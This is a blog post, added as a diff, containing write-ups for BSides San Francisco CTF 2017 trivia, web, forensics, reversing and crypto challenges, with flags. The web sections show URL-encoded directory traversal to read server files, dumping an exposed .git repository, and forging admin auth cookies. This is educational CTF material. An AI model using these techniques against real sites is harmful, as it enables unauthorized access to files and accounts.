@@ -1,0 +1,463 @@
+---
+layout: post
+title: "BSides San Francisco CTF 2017 - Write-ups"
+lang: en
+categories:
+  - security
+  - writeups
+tags:
+  - security
+  - writeups
+  - ctf
+  - misc
+  - crypto
+  - web
+  - forensics
+  - reversing
+date: 2017/02/13
+thumbnail: /images/ctf.png
+---
+## Informations
+
+### Version
+
+| By        | Version | Comment
+| ---       | ---     | ---
+| noraj     | 1.0     | Creation
+
+### CTF
+
+- **Name** : BSides San Francisco CTF 2017
+- **Website** : [ctf.bsidessf.com](https://scoreboard.ctf.bsidessf.com/)
+- **Type** : Online
+- **Format** : Jeopardy
+- **CTF Time** : [link](https://ctftime.org/event/414)
+
+## 1 - Hackers - Misc
+
+> Hack the \__!
+
+Answer: `planet`
+
+## 20 - NOP - Misc
+
+> x86's NOP is actually another instruction. What is the Intel syntax representation of the assembly of the other instruction?
+>
+> Include a space between operands, if applicable.
+
+Answer: `xchg eax, eax`
+
+[Details](https://en.wikipedia.org/wiki/NOP)
+
+# 1 - Ancient Hop Grain Juice - Misc
+
+> This beverage, brewed since ancient times, is made from hops and grains?
+
+Answer: `beer`
+
+# 1 - The Wrong Cipher - Misc
+
+> This cipher was used incorrectly in WEP
+
+Answer: `RC4`
+
+[Details](https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy)
+
+# 1 - The Right Cipher - Misc
+
+> This cipher was correctly used in TKIP
+
+Answer: `RC4`
+
+[Details](https://en.wikipedia.org/wiki/Temporal_Key_Integrity_Protocol)
+
+# 1 - Let's play a game - Misc
+
+> This is the name of the game that a young hacker thinks he's playing with the WOPR Supercomputer. [Spaces expected]
+
+Answer: `Global Thermonuclear War`
+
+[Details](https://en.wikipedia.org/wiki/WarGames)
+
+# 1 - Quote - Misc
+
+> This movie featured the memorable phrase "My voice is my passport"
+
+Answer: `Sneakers`
+
+[Movie](http://www.imdb.com/title/tt0105435/quotes)
+
+# 20 - Zumbo 1 - Web
+
+> Welcome to ZUMBOCOM....you can do anything at ZUMBOCOM.
+>
+> Three flags await. Can you find them?
+>
+> http://zumbo-8ac445b1.ctf.bsidessf.net
+>
+> Stages 2 and 3 - coming soon!
+
+View source of http://zumbo-8ac445b1.ctf.bsidessf.net/index.template
+
+```html
+<!-- page: index.template, src: /code/server.py -->
+```
+
+Let's check the `/code/server.py` path: http://zumbo-8ac445b1.ctf.bsidessf.net/code/server.py. We get an error:
+
+```
+[Errno 2] No such file or directory: u'code/server.py'
+<!-- page: code/server.py, src: /code/server.py -->
+```
+
+Every non-existing page give the same error. We need to do a directory traversal: http://zumbo-8ac445b1.ctf.bsidessf.net/../../../../code/server.py. But unfortunately the `../../../../` part is automatically removed.
+
+So I just URLencoded this part to bypass the filter: http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2f..%2f..%2fcode/server.py.
+
+And we get the `server.py` source:
+
+```python
+import flask, sys, os
+import requests
+
+app = flask.Flask(__name__)
+counter = 12345672
+
+
+@app.route('/<path:page>')
+def custom_page(page):
+    if page == 'favicon.ico': return ''
+    global counter
+    counter += 1
+    try:
+        template = open(page).read()
+    except Exception as e:
+        template = str(e)
+    template += "\n<!-- page: %s, src: %s -->\n" % (page, __file__)
+    return flask.render_template_string(template, name='test', counter=counter);
+
+@app.route('/')
+def home():
+    return flask.redirect('/index.template');
+
+if __name__ == '__main__':
+    flag1 = 'FLAG: FIRST_FLAG_WASNT_HARD'
+    with open('/flag') as f:
+            flag2 = f.read()
+    flag3 = requests.get('http://vault:8080/flag').text
+
+    print "Ready set go!"
+    sys.stdout.flush()
+    app.run(host="0.0.0.0")
+
+<!-- page: ../../../../code/server.py, src: /code/server.py -->
+```
+
+Flag was `FLAG: FIRST_FLAG_WASNT_HARD`.
+
+**PS**: Only `page` is used so `http://zumbo-8ac445b1.ctf.bsidessf.net/server.py` also works...
+
+# 100 - Zumbo 2 - Web
+
+> Welcome to ZUMBOCOM....you can do anything at ZUMBOCOM.
+>
+> Three flags await. Can you find them?
+>
+> http://zumbo-8ac445b1.ctf.bsidessf.net
+>
+> Stage 3 - coming soon!
+
+For the next part of the challenge, we already got the `server.py` source so I looked again at the flag2 part:
+
+```python
+    with open('/flag') as f:
+            flag2 = f.read()
+```
+
+Ok the flag is in `/flag` so just change `http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2f..%2f..%2fcode/server.py` into `http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2f..%2f..%2fflag`.
+
+And get the flag: `FLAG: RUNNER_ON_SECOND_BASE`.
+
+# 100 - the-year-2000 - Web
+> Wait, what year is it?
+>
+> http://theyear2000.ctf.bsidessf.net/
+
+The author says on this home page:
+
+> I made this website all by myself using these tools
+>
+>+ html
+>+ notepad++
+>+ git
+>+ apache
+
+I tried `http://theyear2000.ctf.bsidessf.net/.git/` and it returned me *Forbidden* error. So there is a `.git` repot here.
+
+As usual I used [GitTools](https://github.com/internetwache/GitTools) to dump the repository:
+
+```
+$ ./gitdumper.sh http://theyear2000.ctf.bsidessf.net/.git/ repo
+Destination folder does not exist
+Creating repo/.git/
+Downloaded: HEAD
+Downloaded: objects/info/packs
+Downloaded: description
+Downloaded: config
+Downloaded: COMMIT_EDITMSG
+Downloaded: index
+Downloaded: packed-refs
+Downloaded: refs/heads/master
+Downloaded: refs/remotes/origin/HEAD
+Downloaded: refs/stash
+Downloaded: logs/HEAD
+Downloaded: logs/refs/heads/master
+Downloaded: logs/refs/remotes/origin/HEAD
+Downloaded: info/refs
+Downloaded: info/exclude
+Downloaded: objects/4e/ec6b9c6e464c35fff1efb8444dd0ac1ae67b30
+Downloaded: objects/00/00000000000000000000000000000000000000
+Downloaded: objects/e0/39a6684f53e818926d3f62efd25217b25fc97e
+Downloaded: objects/9e/9ce4da43d0d2dc10ece64f75ec9cab1f4e5de0
+Downloaded: objects/f3/a3f88425975542bb0058651867f8090fed250f
+Downloaded: objects/0c/e1cbf654058dd4b9ba0df440a02aef408f76da
+Downloaded: objects/bd/72ee2c7c5adb017076fd47a92858cef2a04c11
+Downloaded: objects/e1/6b652d659d50fc5e7aecae789e743c0a8fa035
+Downloaded: objects/7c/57d178eea98e174f3d6ef521126117478085ed
+Downloaded: objects/7b/aff32394e517c44f35b75079a9496559c88053
+```
+
+A quick `git log -p` show me this commit:
+
+```diff
+commit 4eec6b9c6e464c35fff1efb8444dd0ac1ae67b30
+Author: Mark Zuckerberg <thezuck@therealzuck.zuck>
+Date:   Sat Feb 11 22:54:32 2017 +0000
+
+    Wooops, didn't want to commit that. Rebased.
+
+diff --git a/index.html b/index.html
+index 7c57d17..e16b652 100644
+--- a/index.html
++++ b/index.html
+@@ -15,7 +15,7 @@ pre {
+ </style>
+ </head>
+ <body>
+-<h1>Welcome to my homepage!!!!</h1>
++<h1>Welcome to my homepage, there are no flags here.!!!!</h1>
+ <hr>
+ <p>I made this website all by myself using these tools
+ <ul>
+```
+
+There was a rebase so let's see when it happened:
+
+```
+$ git reflog
+4eec6b9 HEAD@{0}: commit: Wooops, didn't want to commit that. Rebased.
+e039a66 HEAD@{1}: reset: moving to HEAD~1
+9e9ce4d HEAD@{2}: commit: Fixed a spelling error
+e039a66 HEAD@{3}: commit (initial): First commit on my website
+```
+
+Ok so we have to come back before the HEAD reset:
+
+```
+$ git reset --hard HEAD@{2}
+HEAD is now at 9e9ce4d Fixed a spelling error
+```
+
+Now let's take a look at this fix: `git log -p -1`
+
+```diff
+commit 9e9ce4da43d0d2dc10ece64f75ec9cab1f4e5de0
+Author: Mark Zuckerberg <thezuck@therealzuck.zuck>
+Date:   Sat Feb 11 22:54:27 2017 +0000
+
+    Fixed a spelling error
+
+diff --git a/index.html b/index.html
+index 7c57d17..7baff32 100644
+--- a/index.html
++++ b/index.html
+@@ -43,3 +43,4 @@ ______________________
+ </pre>
+ </marquee>
+ </body></html>
++Your flag is... FLAG:what_is_HEAD_may_never_die
+```
+
+Here is teh flag: `FLAG:what_is_HEAD_may_never_die`.
+
+# 40 - easycap - Forensics
+
+> Can you get the flag from the packet capture?
+>
+> + [easycap.pcap](https://scoreboard.ctf.bsidessf.com/attachment/5e1cb4ad2dd6aef750654f5377d9e67ed2732b97fe64d56e0603242c4b87d921)
+
+This is some raw tcp frames and some of them have 1 byte of additional data.
+
+Let's extract that with *tshark*:
+
+```
+$ tshark -r easycap.pcap -T fields -e data | tr -d '\n'
+464c41473a33383562383761666338363731646565303735353032393064313661383037310a%
+```
+
+Now translate hex to ASCII with a little ruby trick:
+
+```ruby
+irb(main):008:0> ['464c41473a33383562383761666338363731646565303735353032393064313661383037310a'].pack('H*')
+=> "FLAG:385b87afc8671dee07550290d16a8071\n"
+```
+
+Flag is `FLAG:385b87afc8671dee07550290d16a8071`.
+
+# 10 - Easy - Reversing
+
+> This one is easy.
+>
+> + [easy-32](https://scoreboard.ctf.bsidessf.com/attachment/ee2246fd415195570644107a359662e536f87c438c00a65d54b165d5534bd971)
+> + [easy-64](https://scoreboard.ctf.bsidessf.com/attachment/4d761392565db05fde85a2d5d4f254954a989a2ac39acf0357dba45bd70a4db0)
+
+```
+$ strings easy-64 | grep -i flag
+FLAG:db2f62a36a018bce28e46d976e3f9864
+```
+
+# 30 - easyauth - Web
+
+> Can you gain admin access to this site?
+>
+> http://easyauth-afee0e67.ctf.bsidessf.net
+>
+> + [easyauth.php](https://scoreboard.ctf.bsidessf.com/attachment/cdbec071e3710a8465030f032d44e72ab2449098c9ad6597256087751d19bb39)
+
+Hint say to log in with: guest/guest
+
+We have a cookie like this:
+
+```
+auth=username=guest&date=2017-02-13T21:09:45+0000&
+```
+
+If we click on the link we get the following message:
+
+> It's cool that you logged in, but unfortunately we can only give the flag to 'administrator'. :(
+
+Configure proxy and launch burpsuite.
+
+Then change `guest` into `administrator` in the cookie and send. You now get the flag:
+
+> Congratulations, you're the administrator! Here's your reward:
+>
+> FLAG:0076ecde2daae415d7e5ccc7db909e7e
+
+# 450 - vhash - Crypto
+
+> ---- Due to a bug, the challenge might be easier than intended. Enjoy the free points! ----
+>
+> Can you gain admin access to this site?
+>
+> (The vhash binary is what's used for signing the cookie)
+>
+> http://vhash-c6bb0e85.ctf.bsidessf.net:9292
+>
+> + [vhash.zip ](https://scoreboard.ctf.bsidessf.com/attachment/97a121e61a9dba819eb07de40ddad8ac23c11ee4f92055110a7c6f987c73ed83)
+
+The zip contain the `vhash` ELF executable and the `index.php` source:
+
+```php
+<?php
+  require_once('./auth.php');
+
+  function do_hash($data) {
+    $filename = tempnam(sys_get_temp_dir(), 'vhash');
+    file_put_contents($filename, $data);
+
+    $hash = substr(`/home/ctf/vhash $filename`, 0, 256);
+    unlink($filename);
+
+    return $hash;
+  }
+
+  function create_hmac($data) {
+    return do_hash(SECRET . $data);
+  }
+
+  if(isset($_GET['action']) && $_GET['action'] === 'logout') {
+    setcookie('auth', '');
+    header('Location: index.php');
+  }
+
+  if(isset($_POST['username'])) {
+    # Do pagey stuff
+    if(is_valid($_POST['username'], $_POST['password'])) {
+      # Create the cookie
+      $cookie = 'username=' . $_POST['username'] . '&';
+      $cookie .= 'date=' . date(DATE_ISO8601) . '&';
+      $cookie .= 'secret_length=' . strlen(SECRET) . '&';
+
+      # Sign the cookie
+      $cookie = create_hmac($cookie) . '|' . $cookie;
+      setcookie('auth', $cookie);
+      print "<h1>Login successful!</h1>\n";
+      print "<p>Setting cookie: <tt>auth=$cookie</tt></p>\n";
+    } else {
+      print "<h1>Username or password was incorrect!</h1>\n";
+    }
+    print "<p>Click <a href='index.php'>here</a> to continue!</p>\n";
+    exit(0);
+  }
+
+  if(!isset($_COOKIE['auth'])) {
+    require_once('./login_form.php');
+    exit(0);
+  }
+
+  list($hmac, $cookie) = explode('|', $_COOKIE['auth'], 2);
+  if(create_hmac($cookie) !== $hmac) {
+    setcookie('auth', '');
+    print "<p>Something was wrong with your auth cookie!</p>\n";
+    print "<p>Click <a href='index.php'>here</a> to log in again!</p>\n";
+    exit();
+  }
+
+  $pairs = explode('&', $cookie);
+  $args = array();
+  foreach($pairs as $pair) {
+    if(!strpos($pair, '='))
+      continue;
+
+    list($name, $value) = explode('=', $pair, 2);
+    $args[$name] = $value;
+  }
+  $username = $args['username'];
+
+  print "<h1>Welcome back, $username!</h1>\n";
+  if($username == 'administrator') {
+    print "<p>Congratulations, you're the administrator! Here's your reward:</p>\n";
+    print "<p>" . FLAG . "</p>\n";
+  } else {
+    print "<p>It's cool that you logged in, but unfortunately we can only give the flag to 'administrator'. :(</p>\n";
+  }
+  print "<p><a href='/index.php?action=logout'>Log out</a></p>\n";
+?>
+```
+
+Description says the challenge is more easy due to a bug, here it is:
+
+```php
+  if($username == 'administrator')
+```
+
+So the challenge is exactly like the previous **30 - easyauth - Web**.
+
+Configure proxy and launch burpsuite.
+
+Then change `guest` into `administrator` in the cookie and send. You now get the flag:
+
+> Congratulations, you're the administrator! Here's your reward:
+>
+> FLAG:180e2300112ef5a4f23c93cfdec8d780
